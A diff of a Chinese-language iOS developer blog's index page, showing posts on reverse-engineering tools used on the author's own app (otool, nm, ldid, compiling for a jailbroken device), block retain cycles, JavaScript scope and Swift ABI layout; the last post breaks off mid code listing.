+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">WQAlbum:
+</span><span class="line">(__TEXT,__text) section
+</span><span class="line">start:
+</span><span class="line">00002de0    pushl    $0x00
+</span><span class="line">00002de2    movl    %esp,%ebp
+</span><span class="line">00002de4    andl    $0xf0,%esp
+</span><span class="line">00002de7    subl    $0x10,%esp
+</span><span class="line">00002dea    movl    0x04(%ebp),%ebx
+</span><span class="line">……</span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p>如果只对某个对象的值的改变感兴趣的话，就可以使用 KVO 消息传递。不过有一些前提：第一，接收者（接收对象改变的通知的对象）需要知道发送者 （值会改变的对象）；第二，接收者需要知道发送者的生命周期，因为它需要在发送者被销毁前注销观察者身份。如果这两个要去符合的话，这个消息传递机制可以一对多（多个观察者可以注册观察同一个对象的变化）</p>
+<p>② nm，显示程序符号表，用我自己的应用程序私人相册现身说法一下：
+<code>nm -g WQAlbum  （ -g 代表 global ）</code></p>
 
-<p>If you plan to use KVO on Core Data objects, you have to know that things work a bit differently here. This has to do with Core Data&#8217;s faulting mechanism. Once a managed object turns into a fault, it will fire the observers on its properties although their values haven&#8217;t changed.</p>
+<p>可以得到：</p>
 
-<p>如果要在 Core Data 上使用 KVO 的话，方法会有些许差别。这和 Core Data 的 faulting 机制有关。一旦一个 managed object 被 faulting 处理的话，即使它的属性没有被改变，它还是会触发相应的观察者。</p>
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">001e5eec S _OBJC_IVAR_$_WQPhotoViewController.albumObject
+</span><span class="line">001e5efc S _OBJC_IVAR_$_WQPhotoViewController.int_current
+</span><span class="line">001e5f00 S _OBJC_IVAR_$_WQPhotoViewController.int_total</span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<blockquote>
-  <span class="secondary radius label">编者注</span> 把属性值先取入缓存中，在对象需要的时候再进行一次访问，这在 Core Data 中是默认行为，这种技术称为 Faulting。这么做可以避免降低内存开销，但是如果你确定将访问结果对象的具体属性值时，可以禁用 Faults 以提高获取性能。关于这个技术更多的情况，请移步<a href="https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/CoreData/Articles/cdFaultingUniquing.html">官方文档</a>
-</blockquote>
+<p>其中，WQPhotoViewController 为类名，albumObject 为该类的成员</p>
 
-<h3>通知</h3>
+<p>③ ldid，是 iPhoneOS.platform 提供的签名工具，我们自己编译的程序需要签上名才能跑在 iPhone/iPad 上，使用方法</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">export CODESIGN_ALLOCATE=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/codesign_allocate
+</span><span class="line">ldid -S helloworld</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<h3>编译 Hello World</h3>
+
+<h4>首先找到编译器：</h4>
+
+<div class="figure" id="figure-1-1">
+    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f6z8vi0nwej20sg04rjuo.jpg" />
+
+    <p class="caption"><strong>图片 1.1</strong> hacktools1</p>
+</div>
+
+
+<p><code>arm-apple-darwin10-llvm-gcc-4.2</code> 就是了。
+为了方便起见，可以在 <code>.bashrc</code> 或者 <code>profile</code> 配置下环境变量，方便编译。</p>
+
+<h4>找到 SDK</h4>
+
+<p>编译我们自己的程序的时候需要指定该目录下的 SDK 。</p>
+
+<h4>来个经典 Hello World ：</h4>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#include &lt;stdio.h&gt;                                                                                            </span>
+</span><span class="line"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span><span class="line">       <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello world !!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class="line">       <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<h4>编译</h4>
+
+<div class="figure" id="figure-1-2">
+    <img src="http://ww4.sinaimg.cn/large/626e5d69jw1f6z8wxuoppj20p202b3zt.jpg" alt="hacktools2" />
+
+    <p class="caption"><strong>图片 1.2</strong> hacktools2</p>
+</div>
+
+
+<p>其中 -isysroot 用来指定 build 时的 SDK</p>
+
+<h4>校验</h4>
+
+<div class="figure" id="figure-1-3">
+    <img src="http://ww4.sinaimg.cn/large/626e5d69jw1f6z8y87hmhj20sg026759.jpg" alt="hacktools3" />
+
+    <p class="caption"><strong>图片 1.3</strong> hacktools3</p>
+</div>
+
+
+<p>file 查看一下类型，没问题。</p>
+
+<h4>SCP 给 iPhone、iPad</h4>
+
+<p>前提是，设备已经越狱并且安装了 SSH ,且必须在同一网段。
+<code>$scp helloworld root@x.x.x.x:hello world</code></p>
+
+<h4>登录设备签名</h4>
+
+<p><code>$ssh -l root x.x.x.x</code></p>
+
+<p><code>#ldid -S helloworld</code></p>
+
+<h4>执行程序</h4>
+
+<div class="code code">
+<pre class="code"> #./helloworld
+Hello world !!!</pre>
+</div>
+
+<p>运行成功，这就完成了最简单的手动执行自己的应用程序。</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
 
 		
-		<a href="/Blog/blog/2014/05/14/xiao-xi-chuan-di-ji-zhi/" class="more-link">Read on &rarr;</a>
+		
 	</div>
 
 
@@ -730,7 +845,489 @@
 
 </div>
 	
-	<div class="comments"><a href="/Blog/blog/2014/05/14/xiao-xi-chuan-di-ji-zhi/#disqus_thread">Comments</a></div>
+	<div class="comments"><a href="/Blog/blog/2016/08/19/ioshei-ke-gong-ju/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/18/xun-huan-yin-yong-hui-dao-zhi-beng-kui-ma-%3F/">
+		
+			循环引用会导致崩溃吗？</a>
+	</h2>
+	<div class="entry-content">
+		<p>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="err">@</span><span class="n">weakify</span><span class="p">(</span><span class="n">self</span><span class="p">);</span>
+</span><span class="line">   <span class="k">return</span> <span class="p">[</span><span class="n">RACSignal</span> <span class="nl">createSignal:</span><span class="o">^</span><span class="n">RACDisposable</span> <span class="o">*</span> <span class="p">(</span><span class="kt">id</span><span class="o">&lt;</span><span class="n">RACSubscriber</span><span class="o">&gt;</span> <span class="n">subscriber</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">       <span class="err">@</span><span class="n">strongify</span><span class="p">(</span><span class="n">self</span><span class="p">);</span>
+</span><span class="line">       <span class="k">return</span> <span class="nb">nil</span><span class="p">;</span>
+</span><span class="line">   <span class="p">}];</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+在 <code>block</code> 没有调用前, <code>self delloc</code>了,在<code> block </code>里面<code> strongself </code>应该可以获取的变量，个人理解,<code>block </code>中的<code> self </code>算是局部变量,有<code> block </code>持有,销毁情况只跟<code> block </code>有关系</p>
+<p>也有人说<code> strongSelf </code>只是保证在<code> block </code>里面有值，这样说也没错，我测试也是<code> strong </code>里面保持有值得，即使外部的<code> self </code>释放了，所以内部才用<code> strongSelf </code>啦</p>
+<p>那平常我们在没有用这个框架的时候,都是用__weak,这样的话,<code> block </code>里边的<code>weakself</code>,在<code>self dealloc</code>后 , 还有么？dealloc 会置为 nil
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">__weak</span> <span class="n">typeof</span><span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="n">weakself</span> <span class="o">=</span> <span class="n">self</span><span class="p">;</span>
+</span><span class="line">    <span class="k">return</span> <span class="p">[</span><span class="n">RACSignal</span> <span class="nl">createSignal:</span><span class="o">^</span><span class="n">RACDisposable</span> <span class="o">*</span> <span class="p">(</span><span class="kt">id</span><span class="o">&lt;</span><span class="n">RACSubscriber</span><span class="o">&gt;</span> <span class="n">subscriber</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">        <span class="k">return</span> <span class="nb">nil</span><span class="p">;</span>
+</span><span class="line">    <span class="p">}];</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>对于内部有多函数调用 用它有隐患,也就是说这样写,是不好的？</p>
+<p>是的,这样可以避免<code>block</code>执行过程中<code>self</code>对象被释放</p>
+<p>外部的 <code>weak</code> 是为了防止因为<code> self </code>导致的循环引用,但是如果这时候<code> self </code>被释放的话,内部的<code> weakself </code>就为空了,所以一般内部会用<code> __strong </code>生声明一下<code> __weak typeof(self) weakSelf = self; </code>最安全用法:block外部:<code>  __weak __typeof(self) weakSelf = self; </code>block内部:<code> __strong __typeof(weakSelf) strongSelf = weakSelf; </code>why:<code> weakSelf </code>是为了<code>block</code>不持有<code>self</code>, 避免循环引用, 而再声明一个<code>strongSelf</code>是因为一旦进入<code>block</code>执行, 就不允许<code>self</code>在这个执行过程中释放.<code> block</code>执行完成后这个<code>strongSelf</code>会自动释放, 没有循环引用问题.
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line">  <span class="n">__weak</span> <span class="n">typeof</span><span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="n">weakSelf</span> <span class="o">=</span> <span class="n">self</span><span class="p">;</span>
+</span><span class="line">  <span class="n">dispatch_async</span><span class="p">(</span><span class="n">dispatch_get_main_queue</span><span class="p">(),</span> <span class="o">^</span><span class="p">{</span>
+</span><span class="line">    <span class="p">[</span><span class="n">weakSelf</span> <span class="n">doThis</span><span class="p">];</span>
+</span><span class="line">    <span class="p">[</span><span class="n">weakSelf</span> <span class="n">doThat</span><span class="p">];</span>
+</span><span class="line">    <span class="p">[</span><span class="n">Manager</span><span class="p">.</span><span class="n">sharedInstance</span> <span class="n">updateSuccessCount</span><span class="p">];</span>
+</span><span class="line">  <span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+如上,<code>block</code>内部发送了两条消息, 如果只是一条, 那么采用<code>weakSelf</code>是没有问题的.但如果是两条消息,y通过看<code>Clang</code>的document能够看到, 以为<code>Clang</code>有可能会重新计算对象的引用计数, <code>weakSelf</code>有可能被置为nil, 这一过程发生在<code>block</code>内部执行完doThis之后, 还没有执行doThat之前.
+我现在这外部<code> weakself </code>释放了,里面的<code> strongself </code>也跟着释放了.
+<br />
+<img src="http://ww4.sinaimg.cn/large/626e5d69gw1f6y6tdb3mvj20ks06ejso.jpg" alt="" />
+<br />
+那么这里用<code>weakself  </code>是不是不对呢？
+刚才那里用<code>weakSelf</code>是没错的。为什么？
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">__weak</span> <span class="n">typeof</span><span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="n">weakSelf</span> <span class="o">=</span> <span class="n">self</span><span class="p">;</span>
+</span><span class="line"><span class="n">dispatch_async</span><span class="p">(</span><span class="n">dispatch_get_main_queue</span><span class="p">(),</span> <span class="o">^</span><span class="p">{</span>
+</span><span class="line">      <span class="k">if</span><span class="p">(</span><span class="n">weakSelf</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">      <span class="n">__strong</span> <span class="n">typeof</span><span class="p">(</span><span class="n">weakSelf</span><span class="p">)</span> <span class="n">strongSelf</span> <span class="o">=</span> <span class="n">weakSelf</span><span class="p">;</span>
+</span><span class="line">      <span class="p">[</span><span class="n">strongSelf</span> <span class="n">doThis</span><span class="p">];</span>
+</span><span class="line">      <span class="p">[</span><span class="n">weakSelf</span> <span class="n">doThat</span><span class="p">];</span>
+</span><span class="line">      <span class="p">[</span><span class="n">Manager</span><span class="p">.</span><span class="n">sharedInstance</span> <span class="n">updateSuccessCount</span><span class="p">];</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line"><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+内部的<code>typeof()</code>括号里面的是<code> weakSelf</code>啦
+这样<code>block</code>会把<code>weakSelf</code>放到内部的一个持有变量表里面,我测试,当在内部强引用这<code> self</code>, 视图被销毁,先走 <code>delloc</code>, 然后<code> strongself </code>还是存在的。
+不是有一个持有变量表么,按道理来讲<code>block</code>中的<code>weakself</code>,应该是一直有的啊<code>block</code>持有<code>weakSelf</code>，因为是<code>weak</code>变量所以不会增加引用计数。如果<code>self</code>对象在<code>block</code>执行之前就没有其他<code>strong</code>变量持有它，就会释放，后面<code>block</code>执行的时候<code>weakSelf</code>就已经是<code>nil</code>了。但是如果<code>block</code>开始执行，<code>strongSelf</code>又持有了<code>self</code>对象，这时候即使没有其他<code>strong</code>变量持有，<code>self</code>对象也不会释放。<code>block</code>执行完毕后，局部变量<code>strongSelf</code>被系统自动回收，这时候<code>self</code>变量引用计数会-1，如果没有其他变量持有，就会释放。总之，<code>strongSelf</code>不能确保<code>block</code>执行时<code>self</code>对象还存在，但是一旦开始执行时<code>self</code>还在，<code>strongSelf</code>可以给<code>self</code>续命到<code>block</code>执行结束
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">__weak</span> <span class="n">typeof</span><span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="n">weakSelf</span> <span class="o">=</span> <span class="n">self</span><span class="p">;</span>
+</span><span class="line"><span class="p">[</span><span class="n">self</span> <span class="nl">doSomethingInBackgroundWithBlock:</span><span class="o">^</span><span class="p">{</span>
+</span><span class="line">    <span class="n">__strong</span> <span class="n">typeof</span><span class="p">(</span><span class="n">weakSelf</span><span class="p">)</span> <span class="n">strongSelf</span> <span class="o">=</span> <span class="n">weakSelf</span><span class="p">;</span>
+</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="n">strongSelf</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">        <span class="p">[</span><span class="n">strongSelf</span> <span class="n">doSomethingInBlock</span><span class="p">];</span>
+</span><span class="line">        <span class="p">[</span><span class="n">strongSelf</span> <span class="n">doSomethingElseInBlock</span><span class="p">];</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line"><span class="p">}];</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>其实这里不if 倒也没关系，反正给nil发消息什么也不会发生。不过加上逻辑更明确。发送消息没关系，但是访问他的变量就完了
+<img src="http://ww1.sinaimg.cn/large/626e5d69gw1f6y6vf2fhpj209204pgm4.jpg" alt="" />
+<br />
+这个就会崩溃。
+嗯，循环引用大致是这样
+</p>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/18/xun-huan-yin-yong-hui-dao-zhi-beng-kui-ma-%3F/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/18/javascriptde-zuo-yong-yu/">
+		
+			JavaScript的作用域</a>
+	</h2>
+	<div class="entry-content">
+		<script type="text/javascript">
+
+    function switchStylestyle(styleName) {
+        $('link[rel*=style][title]').each(function (i) {
+            this.disabled = true;
+            if (this.getAttribute('title') == styleName) this.disabled = false;
+        });
+    }
+
+    $(function () {
+        $('.markdown-body pre').addClass('prettyprint');
+        prettyPrint();
+
+        $(".markdown-body pre").each(function () {
+            var lines = $(this).attr("data-strong-lines");
+            if (lines == undefined || lines == "")
+                return;
+            var nums = lines.split(' ');
+            if (nums.length > 0)
+                for (var i = 0; i < nums.length; i++) {
+                    $(this).find("li:nth-child(" + nums[i] + ")").addClass("strong-code-line");
+                }
+        });
+
+    });
+
+
+</script>
+
+<h1>　作用域是什么</h1>
+<p>几乎所有编程语言最基本的功能之一，就是能够储存变量当中的值，并且能在之后对这个值进行访问或修改。事实上，正是这种储存和访问变量的值的能力将<strong>状态</strong>带给了程序。</p>
+<p>若没有了状态这个概念，程序虽然也能够执行一些简单的任务，但它会受到高度限制，做不到非常有趣。</p>
+<p>但是将变量引入程序会引起几个很有意思的问题，也正是我们将要讨论的：这些变量<strong>住在</strong>哪里？换句话说，它们储存在哪里？最重要的是，程序需要时如何找到它们？</p>
+<p>这些问题说明需要一套设计良好的规则来存储变量，并且之后可以方便地找到这些变量。这套规则被称为<strong>作用域</strong>。</p>
+<p>但是，究竟在哪里而且怎样设置这些<strong>作用域</strong>的规则呢？</p>
+<h2>　编译原理</h2>
+<p>尽管通常将JavaScript归类为“动态”或“解释执行”语言，但事实上它是一门编译语言。这个事实对你来说可能显而易见，也可能你闻所未闻，取决于你接触过多少编程语言，具有多少经验。但与传统的编译语言不同，它<strong>不是</strong>提前编译的，编译结果也不能在分布式系统中进行移植。</p>
+<p>尽管如此，JavaScript引擎进行编译的步骤和传统的编译语言非常相似，在某些环节可能比预想的要复杂。</p>
+<p>在传统编译语言的流程中，程序中的一段源代码在执行<strong>之前</strong>会经历三个步骤，统称为“编译”。</p>
+<ul>
+<li><p><strong>分词/词法分析</strong>（Tokenizing/Lexing）</p>
+<p>这个过程会将由字符组成的字符串分解成（对编程语言来说）有意义的代码块，这些代码块被称为词法单元（token）。例如，考虑程序<code>var a = 2;</code>。这段程序通常会被分解成为下面这些词法单元：<code>var</code>、<code>a</code>、<code>=</code>、<code>2</code> 、<code>;</code>。空格是否会被当作词法单元，取决于空格在这门语言中是否具有意义。</p>
+</li>
+</ul>
+<blockquote>
+<p><img src="http://epub.ituring.com.cn/api/storage/getbykey/screenshow?key=1405bfdb7c117638d93d" alt="" width="5%" style="width: 5%" />分词（tokenizing）和词法分析（Lexing）之间的区别是非常微妙、晦涩的，主要差异在于词法单元的识别是通过<strong>有状态</strong>还是<strong>无状态</strong>的方式进行的。简单来说，如果词法单元生成器在判断<code>a</code>是一个独立的词法单元还是其他词法单元的一部分时，调用的是有状态的解析规则，那么这个过程就被称为<strong>词法分析</strong>。</p>
+</blockquote>
+<ul>
+<li><p><strong>解析/语法分析</strong>（Parsing）</p>
+<p>这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）。</p>
+<p><code>var a = 2;</code>的抽象语法树中可能会有一个叫作<code>VariableDeclaration</code>的顶级节点，接下来是一个叫作<code>Identifier</code>（它的值是<code>a</code>）的子节点，以及一个叫作<code>AssignmentExpression</code>的子节点。<code>AssignmentExpression</code>节点有一个叫作<code>NumericLiteral</code>（它的值是<code>2</code>）的子节点。</p>
+</li>
+</ul>
+<ul>
+<li><p><strong>代码生成</strong></p>
+<p>将AST转换为可执行代码的过程称被称为代码生成。这个过程与语言、目标平台等息息相关。</p>
+<p>抛开具体细节，简单来说就是有某种方法可以将<code>var a = 2;</code>的AST转化为一组机器指令，用来<strong>创建</strong>一个叫作<code>a</code>的变量（包括分配内存等），并将一个值储存在<code>a</code>中。</p>
+</li>
+</ul>
+<blockquote>
+<p><img src="http://epub.ituring.com.cn/api/storage/getbykey/screenshow?key=1405bfdb7c117638d93d" alt="" width="5%" style="width: 5%" />关于引擎如何管理系统资源超出了我们的讨论范围，因此只需要简单地了解引擎可以根据需要创建并储存变量即可。</p>
+</blockquote>
+
+		
+		<a href="/Blog/blog/2016/08/18/javascriptde-zuo-yong-yu/" class="more-link">Read on &rarr;</a>
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/18/javascriptde-zuo-yong-yu/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/06/15/swift-3-dot-0-abi/">
+		
+			Swift 3.0 ABI</a>
+	</h2>
+	<div class="entry-content">
+		<h2><a class="toc-backref" href="#id2">Hard Constraints on Resilience</a><a class="headerlink" href="#hard-constraints-on-resilience" title="Permalink to this headline"></a></h2>
+<p>The root of a class hierarchy must remain stable, at pain of
+invalidating the metaclass hierarchy.  Note that a Swift class without an
+explicit base class is implicitly rooted in the SwiftObject
+Objective-C class.</p>
+
+<h2><a class="toc-backref" href="#id3">Type Layout</a><a class="headerlink" href="#type-layout" title="Permalink to this headline"></a></h2>
+<div class="section" id="fragile-struct-and-tuple-layout">
+<h3><a class="toc-backref" href="#id4">Fragile Struct and Tuple Layout</a><a class="headerlink" href="#fragile-struct-and-tuple-layout" title="Permalink to this headline"></a></h3>
+<p>Structs and tuples currently share the same layout algorithm, noted as the
+&#8220;Universal&#8221; layout algorithm in the compiler implementation. The algorithm
+is as follows:</p>
+<ul class="simple">
+<li>Start with a <strong>size</strong> of <strong>0</strong> and an <strong>alignment</strong> of <strong>1</strong>.</li>
+<li>Iterate through the fields, in element order for tuples, or in <code class="docutils literal"><span class="pre">var</span></code>
+declaration order for structs. For each field:<ul>
+<li>Update <strong>size</strong> by rounding up to the <strong>alignment of the field</strong>, that is,
+increasing it to the least value greater or equal to <strong>size</strong> and evenly
+divisible by the <strong>alignment of the field</strong>.</li>
+<li>Assign the <strong>offset of the field</strong> to the current value of <strong>size</strong>.</li>
+<li>Update <strong>size</strong> by adding the <strong>size of the field</strong>.</li>
+<li>Update <strong>alignment</strong> to the max of <strong>alignment</strong> and the
+<strong>alignment of the field</strong>.</li>
+</ul>
+</li>
+<li>The final <strong>size</strong> and <strong>alignment</strong> are the size and alignment of the
+aggregate. The <strong>stride</strong> of the type is the final <strong>size</strong> rounded up to
+<strong>alignment</strong>.</li>
+</ul>
+<p>Note that this differs from C or LLVM&#8217;s normal layout rules in that <em>size</em>
+and <em>stride</em> are distinct; whereas C layout requires that an embedded struct&#8217;s
+size be padded out to its alignment and that nothing be laid out there,
+Swift layout allows an outer struct to lay out fields in the inner struct&#8217;s
+tail padding, alignment permitting. Unlike C, zero-sized structs and tuples
+are also allowed, and take up no storage in enclosing aggregates. The Swift
+compiler emits LLVM packed struct types with manual padding to get the
+necessary control over the binary layout. Some examples:</p>
+<pre>// LLVM &lt;{ i64, i8 }&gt;
+struct S {
+  var x: Int
+  var y: UInt8
+}
+
+// LLVM &lt;{ i8, [7 x i8], &lt;{ i64, i8 }&gt;, i8 }&gt;
+struct S2 {
+  var x: UInt8
+  var s: S
+  var y: UInt8
+}
+
+// LLVM &lt;{}&gt;
+struct Empty {}
+
+// LLVM &lt;{ i64, i64 }&gt;
+struct ContainsEmpty {
+  var x: Int
+  var y: Empty
+  var z: Int
+}
+</pre></div>
+
+<h3><a class="toc-backref" href="#id5">Class Layout</a><a class="headerlink" href="#class-layout" title="Permalink to this headline"></a></h3>
+<p>Swift relies on the following assumptions about the Objective-C runtime,
+which are therefore now part of the Objective-C ABI:</p>
+<ul class="simple">
+<li>32-bit platforms never have tagged pointers.  ObjC pointer types are
+either nil or an object pointer.</li>
+<li>On x86-64, a tagged pointer either sets the lowest bit of the pointer
+or the highest bit of the pointer.  Therefore, both of these bits are
+zero if and only if the value is not a tagged pointer.</li>
+<li>On ARM64, a tagged pointer always sets the highest bit of the pointer.</li>
+<li>32-bit platforms never perform any isa masking.  <code class="docutils literal"><span class="pre">object_getClass</span></code>
+is always equivalent to <code class="docutils literal"><span class="pre">*(Class*)object</span></code>.</li>
+<li>64-bit platforms perform isa masking only if the runtime exports a
+symbol <code class="docutils literal"><span class="pre">uintptr_t</span> <span class="pre">objc_debug_isa_class_mask;</span></code>.  If this symbol
+is exported, <code class="docutils literal"><span class="pre">object_getClass</span></code> on a non-tagged pointer is always
+equivalent to <code class="docutils literal"><span class="pre">(Class)(objc_debug_isa_class_mask</span> <span class="pre">&amp;</span> <span class="pre">*(uintptr_t*)object)</span></code>.</li>
+<li>The superclass field of a class object is always stored immediately
+after the isa field.  Its value is either nil or a pointer to the
+class object for the superclass; it never has other bits set.</li>
+</ul>
+<p>The following assumptions are part of the Swift ABI:</p>
+<ul class="simple">
+<li>Swift class pointers are never tagged pointers.</li>
+</ul>
+<p>TODO</p>
+<h3><a class="toc-backref" href="#id6">Fragile Enum Layout</a><a class="headerlink" href="#fragile-enum-layout" title="Permalink to this headline"></a></h3>
+<p>In laying out enum types, the ABI attempts to avoid requiring additional
+storage to store the tag for the enum case. The ABI chooses one of five
+strategies based on the layout of the enum:</p>
+<h4><a class="toc-backref" href="#id7">Empty Enums</a><a class="headerlink" href="#empty-enums" title="Permalink to this headline"></a></h4>
+<p>In the degenerate case of an enum with no cases, the enum is an empty type.</p>
+<pre><span class="n">enum</span><span class="w"> </span><span class="n">Empty</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="c1">// =&gt; empty type</span>
+</pre>
+<h4><a class="toc-backref" href="#id8">Single-Case Enums</a><a class="headerlink" href="#single-case-enums" title="Permalink to this headline"></a></h4>
+<p>In the degenerate case of an enum with a single case, there is no
+discriminator needed, and the enum type has the exact same layout as its
+case&#8217;s data type, or is empty if the case has no data type.</p>
+<pre><span class="n">enum</span><span class="w"> </span><span class="n">EmptyCase</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">case</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="p">}</span><span class="w">             </span><span class="c1">// =&gt; empty type</span>
+<span class="n">enum</span><span class="w"> </span><span class="n">DataCase</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">case</span><span class="w"> </span><span class="no">Y</span><span class="p">(</span><span class="n">Int</span><span class="p">,</span><span class="w"> </span><span class="n">Double</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="c1">// =&gt; LLVM &lt;{ i64, double }&gt;</span>
+</pre>
+
+		
+		<a href="/Blog/blog/2016/06/15/swift-3-dot-0-abi/" class="more-link">Read on &rarr;</a>
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/06/15/swift-3-dot-0-abi/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/06/12/dong-hua-xiang-jie/">
+		
+			动画详解</a>
+	</h2>
+	<div class="entry-content">
+		<p>
+最近发现自己对iOS的动画理解很肤浅，于是执行了一段相对复杂的动画，加深自己对CAKeyframeAnimation关键帧动画的理解。
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
